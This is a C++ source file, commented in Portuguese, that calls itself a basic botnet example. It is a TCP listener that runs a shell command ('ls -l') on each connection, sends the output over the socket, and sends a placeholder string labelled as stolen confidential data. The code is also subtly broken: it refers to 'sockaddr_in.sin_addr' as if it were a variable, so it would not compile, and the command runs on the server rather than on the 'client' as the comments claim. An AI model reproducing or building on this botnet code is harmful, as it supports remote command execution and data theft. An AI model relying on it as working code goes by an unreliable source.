/*

Exemplo básico de botnet em c++

*/

#include <iostream>
#include <thread>
#include <sstream>
#include <cstdlib>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

// Configurações da botnet
const char* botnet_ip = "192.168.0.100";
const int botnet_port = 9000;

// Função para lidar com cada conexão de cliente
void handleClient(int clientSocket) {
    char request[1024];
    ssize_t bytesRead = recv(clientSocket, request, sizeof(request), 0);
    std::cout << "Recebida requisição de " << inet_ntoa(sockaddr_in.sin_addr) << ":" << ntohs(sockaddr_in.sin_port) << std::endl;
    
    // Executar comando no sistema do cliente
    const char* command = "ls -l";
    FILE* commandOutput = popen(command, "r");
    if (commandOutput) {
        std::ostringstream output;
        char buffer[256];
        while (fgets(buffer, sizeof(buffer), commandOutput) != nullptr) {
            output << buffer;
        }
        pclose(commandOutput);
        send(clientSocket, output.str().c_str(), output.str().length(), 0);
    }
    
    // Coletar informações do cliente
    const char* stolenData = "Informações confidenciais";
    send(clientSocket, stolenData, strlen(stolenData), 0);
    
    close(clientSocket);
}

// Função principal
int main() {
    int botnetSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (botnetSocket == -1) {
        std::cerr << "Falha ao criar o socket da botnet" << std::endl;
        return 1;
    }

    sockaddr_in botnetAddress;
    memset(&botnetAddress, 0, sizeof(botnetAddress));
    botnetAddress.sin_family = AF_INET;
    botnetAddress.sin_addr.s_addr = inet_addr(botnet_ip);
    botnetAddress.sin_port = htons(botnet_port);

    if (bind(botnetSocket, (struct sockaddr*)&botnetAddress, sizeof(botnetAddress)) < 0) {
        std::cerr << "Falha ao vincular o socket da botnet" << std::endl;
        return 1;
    }

    if (listen(botnetSocket, 5) < 0) {
        std::cerr << "Falha ao aguardar conexões no socket da botnet" << std::endl;
        return 1;
    }

    std::cout << "Botnet ouvindo em " << botnet_ip << ":" << botnet_port << std::endl;

    while (true) {
        sockaddr_in clientAddress;
        socklen_t clientAddressLength = sizeof(clientAddress);
        int clientSocket = accept(botnetSocket, (struct sockaddr*)&clientAddress, &clientAddressLength);
        if (clientSocket < 0) {
            std::cerr << "Falha ao aceitar a conexão do cliente" << std::endl;
            continue;
        }

        std::thread clientThread(handleClient, clientSocket);
        clientThread.detach();
    }

    close(botnetSocket);
    return 0;
}